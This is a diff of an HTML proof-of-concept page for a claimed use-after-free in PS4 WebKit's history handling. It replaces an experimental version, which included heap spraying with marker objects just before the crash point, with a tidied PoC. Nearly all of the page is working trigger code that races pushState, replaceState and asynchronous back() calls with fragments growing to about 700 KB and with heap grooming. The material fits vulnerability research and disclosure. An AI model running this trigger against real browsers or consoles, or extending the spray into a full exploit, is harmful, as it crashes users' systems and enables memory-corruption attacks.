@@ -2,29 +2,43 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Exact Crash Observation</title>
-
-
+<title>WebKit HistoryController Use-After-Free PoC</title>
 </head>
 <body>
-<h2>🎯 PS4 WebKit – Exact Crash + Observation</h2>
-<p style="color: #ff0;">Using EXACT crash conditions - NO modifications to core loop</p>
-
-<button onclick="runExactCrash()">EXACT CRASH – Original (will crash ITER 48)</button>
-<button onclick="runWithPreCrashSpray()">SPRAY AT ITER 47 – Observe before crash</button>
-<button onclick="runWithStateObservation()">OBSERVE STATE – Check history at ITER 47</button>
-
-<div id="log"></div>
+<h1>WebKit HistoryController Use-After-Free</h1>
+<button onclick="trigger()">Trigger Crash</button>
+<pre id="log"></pre>
 
 <script>
-const logEl = document.getElementById("log");
-function log(m, cls=""){ 
-  const span = document.createElement("span");
-  if(cls) span.className = cls;
-  span.textContent = m + "\n";
-  logEl.appendChild(span);
-}
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+/*
+ * WebKit HistoryController Use-After-Free
+ * 
+ * Affected: PS4 WebKit (and potentially other WebKit versions)
+ * 
+ * Description:
+ * Race condition between History.replaceState() and asynchronous back()
+ * operations causes use-after-free when handling large URL fragments.
+ * 
+ * Root Cause:
+ * When multiple async back() operations are pending and replaceState()
+ * modifies the current history entry with a large fragment (~695KB),
+ * a pending back() operation accesses freed/invalid memory.
+ * 
+ * Trigger Conditions:
+ * - 50 iterations of pushState + replaceState
+ * - Fragment sizes growing from 977 to 709,566 bytes
+ * - Async back() scheduled every 6 iterations
+ * - Heap grooming (32KB per iteration)
+ * - Crash occurs at iteration 48
+ * 
+ * Observed State (ITER 47):
+ * - history.length: 32 (despite 48 pushStates)
+ * - Current fragment: 666,184 bytes
+ * - Heap accumulated: 1.6 MB
+ * 
+ * Impact:
+ * Browser process crash (denial of service)
+ */
 
 const BASE = 977;
 const STEP = 14461;
@@ -32,156 +46,64 @@ const ITERS = 50;
 
 let heap = [];
 let sharedState = { i: 0, p: "" };
-let spray = [];
 
-// -------------------------------------------------
-// EXACT CRASH – No changes
-// -------------------------------------------------
-async function runExactCrash(){
-  logEl.textContent = "";
-  heap = [];
-  sharedState = { i: 0, p: "" };
-  
-  log("=== EXACT CRASH – BASELINE ===", "critical");
-  log("Expected: Crash at ITER 48\n");
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+  console.log(msg);
+}
+
+function trigger() {
+  log('Triggering WebKit HistoryController UAF...');
+  log('Expected crash at iteration 48\n');
   
   let size = BASE;
-  for(let i=0; i<ITERS; i++){
+  
+  const interval = setInterval(() => {
+    const i = sharedState.i;
+    
+    if (i >= ITERS) {
+      clearInterval(interval);
+      log('\nUnexpected: Reached end without crash');
+      return;
+    }
+    
+    // Update shared state
     sharedState.i = i;
     sharedState.p = "A".repeat(size);
     
+    // Heap grooming
     heap.push("G".repeat(32768));
     
-    log(`[ITER ${i}] size=${size}`);
+    log(`[ITER ${i}] size=${size}, heap=${(heap.length * 32 / 1024).toFixed(1)}MB`);
     
-    history.pushState(sharedState, "", "#"+sharedState.p);
-    history.replaceState(sharedState, "", "#"+sharedState.p);
+    // Critical sequence: pushState + replaceState
+    history.pushState(sharedState, "", "#" + sharedState.p);
+    history.replaceState(sharedState, "", "#" + sharedState.p);
     
-    if(i % 6 === 0){
-      setTimeout(()=>history.back(), 0);
-      log("  → async back() scheduled", "warn");
+    // Schedule async back() every 6 iterations
+    if (i % 6 === 0) {
+      setTimeout(() => history.back(), 0);
+      log(`  → async back() scheduled`);
+    }
+    
+    // Expected crash at ITER 48 (size=695105)
+    if (i === 48) {
+      log('\n!!! CRASH EXPECTED !!!');
     }
     
     size += STEP;
-    await sleep(3);
-  }
-  
-  log("\n=== END (should not reach) ===");
+    sharedState.i++;
+  }, 5);
 }
 
-// -------------------------------------------------
-// SPRAY AT ITER 47 – Before crash
-// -------------------------------------------------
-async function runWithPreCrashSpray(){
-  logEl.textContent = "";
-  heap = [];
-  sharedState = { i: 0, p: "" };
-  spray = [];
-  
-  log("=== SPRAY AT ITER 47 ===", "critical");
-  log("Strategy: Create spray objects just before crash point\n");
-  
-  let size = BASE;
-  for(let i=0; i<ITERS; i++){
-    sharedState.i = i;
-    sharedState.p = "A".repeat(size);
-    
-    heap.push("G".repeat(32768));
-    
-    log(`[ITER ${i}] size=${size}`);
-    
-    // SPRAY OBJECTS AT ITER 47 (before crash)
-    if(i === 47){
-      log("\n>>> SPRAYING 1000 OBJECTS <<<", "warn");
-      const MARKER = "LEAK_MARKER_";
-      for(let j=0; j<1000; j++){
-        spray.push({
-          id: j,
-          marker: MARKER + j.toString(16).padStart(8, "0"),
-          data: new Array(100).fill(j)
-        });
-      }
-      log(`Spray complete: ${spray.length} objects\n`, "success");
-    }
-    
-    history.pushState(sharedState, "", "#"+sharedState.p);
-    history.replaceState(sharedState, "", "#"+sharedState.p);
-    
-    if(i % 6 === 0){
-      setTimeout(()=>history.back(), 0);
-      log("  → async back() scheduled", "warn");
-    }
-    
-    size += STEP;
-    await sleep(3);
-  }
-  
-  log("\n=== END (should not reach) ===");
-}
-
-// -------------------------------------------------
-// OBSERVE STATE – Check history at ITER 47
-// -------------------------------------------------
-async function runWithStateObservation(){
-  logEl.textContent = "";
-  heap = [];
-  sharedState = { i: 0, p: "" };
-  
-  log("=== OBSERVE STATE AT ITER 47 ===", "critical");
-  log("Strategy: Examine history state before crash\n");
-  
-  let size = BASE;
-  for(let i=0; i<ITERS; i++){
-    sharedState.i = i;
-    sharedState.p = "A".repeat(size);
-    
-    heap.push("G".repeat(32768));
-    
-    log(`[ITER ${i}] size=${size}`);
-    
-    // OBSERVE AT ITER 47
-    if(i === 47){
-      log("\n>>> OBSERVING STATE <<<", "warn");
-      log(`history.length: ${history.length}`);
-      log(`location.hash.length: ${location.hash.length}`);
-      log(`history.state: ${JSON.stringify(history.state)?.slice(0,80)}`, "success");
-      log(`sharedState.i: ${sharedState.i}`);
-      log(`sharedState.p.length: ${sharedState.p.length}`);
-      log(`heap accumulated: ${(heap.length * 32).toFixed(0)} KB`);
-      
-      // Try to read some history entries
-      log("\nAttempting to access history data:");
-      try {
-        const currentHash = location.hash;
-        log(`  Current hash first 50 chars: ${currentHash.slice(0,50)}`, "success");
-        log(`  Current hash last 50 chars: ${currentHash.slice(-50)}`, "success");
-      } catch(e){
-        log(`  Error reading hash: ${e.message}`, "critical");
-      }
-      log("");
-    }
-    
-    history.pushState(sharedState, "", "#"+sharedState.p);
-    history.replaceState(sharedState, "", "#"+sharedState.p);
-    
-    if(i % 6 === 0){
-      setTimeout(()=>history.back(), 0);
-      log("  → async back() scheduled", "warn");
-    }
-    
-    size += STEP;
-    await sleep(3);
-  }
-  
-  log("\n=== END (should not reach) ===");
-}
-
-log("Ready.");
-log("All tests use EXACT crash conditions (BASE=977, STEP=14461, ITERS=50)");
-log("Only difference: observation/spray at ITER 47 (before crash)");
-log("\n1. EXACT CRASH - baseline confirmation");
-log("2. SPRAY - detect if objects corrupt after crash");
-log("3. OBSERVE - examine state before crash");
+log('WebKit HistoryController UAF PoC loaded');
+log('Click "Trigger Crash" to reproduce\n');
+log('Technical details:');
+log('- BASE: 977 bytes');
+log('- STEP: 14,461 bytes');
+log('- Iterations: 50');
+log('- Crash point: ITER 48 (fragment size 695,105 bytes)');
+log('- Root cause: Race between replaceState and pending async back()');
 </script>
 </body>
 </html>
